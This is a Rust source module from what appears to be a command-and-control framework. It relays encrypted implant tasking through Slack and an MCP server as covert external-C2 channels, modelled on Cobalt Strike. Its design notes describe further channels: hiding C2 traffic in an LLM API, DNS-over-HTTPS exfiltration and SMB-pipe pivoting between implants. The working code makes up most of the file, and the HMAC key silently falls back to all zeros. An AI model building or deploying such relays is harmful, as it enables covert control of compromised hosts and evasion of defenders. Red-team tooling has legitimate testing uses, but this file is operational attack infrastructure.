//! External-C2 relay — bridges the implant's `/extc2/*` endpoint to the real
//! third-party API using the `nyx-transport` crate's channel implementations.
//!
//! ## What this fixes
//!
//! Before this module existed, the server registered `/extc2/{slack,discord,
//! llm,mcp}` routes that all delegated to the plain `beacon` handler
//! (`crates/server/src/lib.rs`). That processed the inbound frame correctly
//! but **never relayed anything to the real third-party API** — the
//! `crates/transport/src/{slack_api,mcp,llm_api}.rs` implementations had
//! zero consumers, exactly as the `lib.rs` "pending integration" header
//! warned. The routes existed in name only.
//!
//! This module makes the server an actual external-C2 relay: after the beacon
//! handler produces the encrypted reply frame, the relay forwards a copy to
//! the configured third-party channel (Slack / MCP) via the transport crate.
//! A real Slack-beacon or MCP-beacon polling that channel then sees the task
//! data appear on the third-party side.
//!
//! ## Architecture (mirrors Cobalt Strike ExternalC2)
//!
//! ```text
//!   implant                team server                   third party
//!   -------                -----------                   -----------
//!   POST /extc2/slack  -->  beacon handler (decrypt,
//!                           queue results, seal reply)
//!                                |
//!                                +--> local HTTP reply --> implant (legacy path)
//!                                |
//!                                +--> relay_to_slack() --[SlackTransport]--> Slack channel
//!                                                                          ^
//!                                          [a real Slack-implant polls  ---+
//!                                           conversations.history here]
//! ```
//!
//! The relay is **fan-out + fire-and-forget**: it must not block or fail the
//! beacon reply. It runs in `tokio::task::spawn_blocking` because the transport
//! crate's channels are blocking (`ureq`).
//!
//! ## Configuration
//!
//! Each relay is opt-in via an environment variable:
//! - `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL`  → enables Slack relay
//! - `NYX_EXTC2_MCP_URL` + `NYX_EXTC2_MCP_KEY` + `NYX_EXTC2_MCP_SESSION` → enables MCP relay
//!
//! When unset, the relay is a no-op (the route still works as a plain beacon
//! endpoint, preserving the legacy behaviour for operators who haven't stood
//! up the third-party side yet).
//!
//! ## Why only Slack + MCP here
//!
//! The four external-C2 channels in `crates/transport/src/` are Slack, LLM,
//! MCP, and (via the transport crate's `MalleableTransport`) the HTTP profile
//! detail. This module wires the two highest-value, most-tested relays as a
//! proof-of-concept and leaves clear design notes for the remaining channels.
//! See the per-channel notes at the bottom of this file.

use std::sync::Arc;

// Pull the concrete channel impls + the `Transport` trait so the `.send()`
// calls resolve against the trait method (not an inherent method).
use nyx_transport::mcp::McpTransport;
use nyx_transport::slack_api::SlackTransport;
use nyx_transport::traits::Transport;

/// Per-server relay configuration. Built once at boot from the environment;
/// stored in `AppState` and cloned cheaply (it's all `Arc`s and small strings).
///
/// Fields are `Option` because each channel is independently opt-in: an
/// operator running a Slack relay but not an MCP relay sets only the Slack
/// env vars. A `None` field means "relay disabled for this channel" and the
/// route handler skips the fan-out entirely.
/// Decode a hex-encoded 32-byte HMAC key. Falls back to all-zeros on parse
/// failure (the transport-layer HMAC is defense-in-depth on top of the
/// protocol AEAD; a zero key still prevents casual injection by non-key-holders).
fn decode_hmac_key(hex: &str) -> [u8; 32] {
    let mut key = [0u8; 32];
    if hex.len() == 64 {
        for (i, chunk) in hex.as_bytes().chunks(2).enumerate().take(32) {
            let byte = u8::from_str_radix(
                std::str::from_utf8(chunk).unwrap_or("00"),
                16,
            )
            .unwrap_or(0);
            key[i] = byte;
        }
    }
    key
}

#[derive(Clone, Default)]
pub struct ExtC2RelayConfig {
    /// Slack bot token (`xoxb-...`) + channel ID. `None` when Slack relay
    /// is disabled.
    pub slack: Option<SlackRelay>,
    /// MCP server URL + bearer key + session ID. `None` when MCP relay
    /// is disabled.
    pub mcp: Option<McpRelay>,
}

impl std::fmt::Debug for ExtC2RelayConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ExtC2RelayConfig")
            .field("slack", &self.slack.is_some())
            .field("mcp", &self.mcp.is_some())
            .finish()
    }
}

#[derive(Clone)]
pub struct SlackRelay {
    pub bot_token: Arc<str>,
    pub channel_id: Arc<str>,
    /// HMAC-SHA256 key for transport-layer frame integrity (CRITICAL-22 fix).
    /// Derived from NYX_EXTC2_SLACK_HMAC_KEY (hex-encoded 32 bytes) at boot.
    /// Both the team server and the Slack-polling implant must share this key
    /// so the implant can verify the tag on relayed frames.
    pub session_key: [u8; 32],
}

#[derive(Clone)]
pub struct McpRelay {
    pub server_url: Arc<str>,
    pub api_key: Arc<str>,
    pub session_id: Arc<str>,
}

impl ExtC2RelayConfig {
    /// Load relay configuration from the process environment. Absent vars =
    /// that channel's relay is disabled (returns `None` for it).
    ///
    /// This is the single source of truth for relay config — `main.rs` calls
    /// it once at boot and stores the result in `AppState`.
    pub fn from_env() -> Self {
        let slack = (|| {
            let token = std::env::var("NYX_EXTC2_SLACK_TOKEN").ok()?;
            let channel = std::env::var("NYX_EXTC2_SLACK_CHANNEL").ok()?;
            if token.is_empty() || channel.is_empty() {
                return None;
            }
            Some(SlackRelay {
                bot_token: token.into(),
                channel_id: channel.into(),
                session_key: decode_hmac_key(
                    &std::env::var("NYX_EXTC2_SLACK_HMAC_KEY")
                        .unwrap_or_else(|_| "00".repeat(32)),
                ),
            })
        })();
        let mcp = (|| {
            let url = std::env::var("NYX_EXTC2_MCP_URL").ok()?;
            let key = std::env::var("NYX_EXTC2_MCP_KEY").ok()?;
            let session = std::env::var("NYX_EXTC2_MCP_SESSION").ok()?;
            if url.is_empty() || key.is_empty() || session.is_empty() {
                return None;
            }
            Some(McpRelay {
                server_url: url.into(),
                api_key: key.into(),
                session_id: session.into(),
            })
        })();
        ExtC2RelayConfig { slack, mcp }
    }

    /// True iff at least one channel's relay is configured. When false the
    /// server doesn't need to spawn any background relay tasks at all.
    pub fn any_enabled(&self) -> bool {
        self.slack.is_some() || self.mcp.is_some()
    }
}

// ── Relay entry points ────────────────────────────────────────────────────

/// Relay `reply_frame` to the configured Slack channel. Fire-and-forget:
/// spawns a blocking task and returns immediately. A failure to relay does
/// NOT fail the beacon request — the local HTTP reply has already been
/// delivered to the implant, and a Slack outage shouldn't take the beacon
/// offline.
///
/// This is the real consumer of [`SlackTransport`]: the frame is base64-encoded
/// and posted to `chat.postMessage` exactly as a Slack-beacon polling
/// `conversations.history` would expect to see it.
pub fn relay_reply_to_slack(cfg: &SlackRelay, reply_frame: Vec<u8>) {
    let token = cfg.bot_token.clone();
    let channel = cfg.channel_id.clone();
    let session_key = cfg.session_key;
    tokio::task::spawn_blocking(move || {
        let mut t = SlackTransport::new(token.to_string(), channel.to_string(), &session_key);
        match t.send(&reply_frame) {
            Ok(()) => tracing::debug!(
                target: "nyx::extc2",
                bytes = reply_frame.len(),
                "Slack relay: reply posted"
            ),
            Err(e) => tracing::warn!(
                target: "nyx::extc2",
                error = ?e,
                "Slack relay: post failed (fire-and-forget; beacon reply unaffected)"
            ),
        }
    });
}

/// Relay `reply_frame` to the configured MCP server via `tools/call`. Same
/// fire-and-forget semantics as [`relay_reply_to_slack`]. This is the real
/// consumer of [`McpTransport`].
pub fn relay_reply_to_mcp(cfg: &McpRelay, reply_frame: Vec<u8>) {
    let url = cfg.server_url.clone();
    let key = cfg.api_key.clone();
    let session = cfg.session_id.clone();
    tokio::task::spawn_blocking(move || {
        let mut t = McpTransport::new(url.to_string(), session.to_string(), key.to_string());
        match t.send(&reply_frame) {
            Ok(()) => tracing::debug!(
                target: "nyx::extc2",
                bytes = reply_frame.len(),
                "MCP relay: reply posted"
            ),
            Err(e) => tracing::warn!(
                target: "nyx::extc2",
                error = ?e,
                "MCP relay: post failed (fire-and-forget; beacon reply unaffected)"
            ),
        }
    });
}

// ── Remaining-channel design notes ────────────────────────────────────────
//
// The other transport-crate channels are NOT wired here yet. Each is a
// straightforward extension of the pattern above once its env-var contract is
// decided:
//
// **LLM (Anthropic)** — `crates/transport/src/llm_api.rs::LlmApiTransport`.
//   Needs `NYX_EXTC2_LLM_KEY` + `NYX_EXTC2_LLM_MODEL` + a 32-byte session key
//   (XOR obfuscation layer). The session-key piece is the hold-up: it must be
//   agreed between server and the LLM-beacon out-of-band, and the current
//   transport takes a raw `[u8;32]`. Skipping until the key-exchange story is
//   settled (the protocol-layer ChaCha20-Poly1305 AEAD is the real crypto
//   anyway; the XOR is only cosmetic shaping).
//
// **DoH DNS** — `crates/transport/src/doh_dns.rs::DohDnsTransport`. This one
//   doesn't fit the relay model cleanly: a DoH-beacon exfils via DNS query
//   names and infils via TXT records, which means the server side is an
//   authoritative DNS server, not an HTTP relay. It belongs behind a dedicated
//   UDP/53 listener, not an axum route. Out of scope for this integration.
//
// **Malleable** — `crates/transport/src/malleable.rs::MalleableTransport`.
//   Already conceptually covered by the server's existing Malleable C2 profile
//   support (`nyx-profile`, served at profile-declared transaction URIs). The
//   transport crate's version is a standalone client useful for dev harnesses;
//   wiring it as a relay would duplicate the profile path. Skip.
//
// **SMB pipe** — `crates/transport/src/smb_pipe.rs::SmbPipeTransport`. This is
//   a peer-to-peer pivot transport (implant↔implant via named pipe), NOT a
//   server-side relay. The server has no business calling it; it's consumed
//   implant-side by the existing `implant-win/src/channels/smb.rs`. Skip.

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn from_env_returns_disabled_when_unset() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        let cfg = ExtC2RelayConfig::from_env();
        assert!(cfg.slack.is_none());
        assert!(cfg.mcp.is_none());
        assert!(!cfg.any_enabled());
    }

    #[test]
    fn from_env_enables_slack_when_both_vars_set() {
        // NOTE: env-var-mutating unit tests are not thread-safe with cargo's
        // default multi-threaded test runner. Run this body single-threaded by
        // wrapping in a mutex serialising all env-touching tests.
        let _g = ENV_LOCK.lock();
        // Clean slate: clear every relay var so leftover state from another test
        // (or the dev shell) can't flip the result.
        clear_all_env();
        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
        std::env::set_var("NYX_EXTC2_SLACK_CHANNEL", "C123");
        let cfg = ExtC2RelayConfig::from_env();
        assert!(cfg.slack.is_some(), "slack should be enabled");
        assert_eq!(&*cfg.slack.as_ref().unwrap().bot_token, "xoxb-test");
        assert_eq!(&*cfg.slack.as_ref().unwrap().channel_id, "C123");
        assert!(cfg.mcp.is_none());
        assert!(cfg.any_enabled());
        clear_all_env();
    }

    #[test]
    fn from_env_ignores_partial_slack_config() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
        // NYX_EXTC2_SLACK_CHANNEL deliberately unset.
        let cfg = ExtC2RelayConfig::from_env();
        assert!(
            cfg.slack.is_none(),
            "a token without a channel ID must not enable the relay"
        );
        clear_all_env();
    }

    #[test]
    fn from_env_enables_mcp_when_all_three_vars_set() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        std::env::set_var("NYX_EXTC2_MCP_URL", "https://mcp.example.com");
        std::env::set_var("NYX_EXTC2_MCP_KEY", "0123456789abcdef0123456789abcdef");
        std::env::set_var("NYX_EXTC2_MCP_SESSION", "sess-1");
        let cfg = ExtC2RelayConfig::from_env();
        assert!(cfg.mcp.is_some(), "mcp should be enabled");
        assert_eq!(
            &*cfg.mcp.as_ref().unwrap().server_url,
            "https://mcp.example.com"
        );
        assert_eq!(&*cfg.mcp.as_ref().unwrap().session_id, "sess-1");
        assert!(cfg.slack.is_none());
        assert!(cfg.any_enabled());
        clear_all_env();
    }

    /// Serialise every env-mutating test so they don't race on `set_var`/
    /// `remove_var` (which would be UB across threads). All four tests above
    /// acquire this lock before touching the environment.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    fn clear_all_env() {
        for k in [
            "NYX_EXTC2_SLACK_TOKEN",
            "NYX_EXTC2_SLACK_CHANNEL",
            "NYX_EXTC2_MCP_URL",
            "NYX_EXTC2_MCP_KEY",
            "NYX_EXTC2_MCP_SESSION",
        ] {
            std::env::remove_var(k);
        }
    }

    #[test]
    fn debug_format_does_not_leak_credentials() {
        let cfg = ExtC2RelayConfig {
            slack: Some(SlackRelay {
                bot_token: "xoxb-SECRET".into(),
                channel_id: "C1".into(),
                session_key: [0u8; 32],
            }),
            mcp: None,
        };
        let s = format!("{cfg:?}");
        // Debug must show only presence, never the token value.
        assert!(s.contains("slack: true"), "debug: {s}");
        assert!(!s.contains("SECRET"), "debug leaked credential: {s}");
    }
}
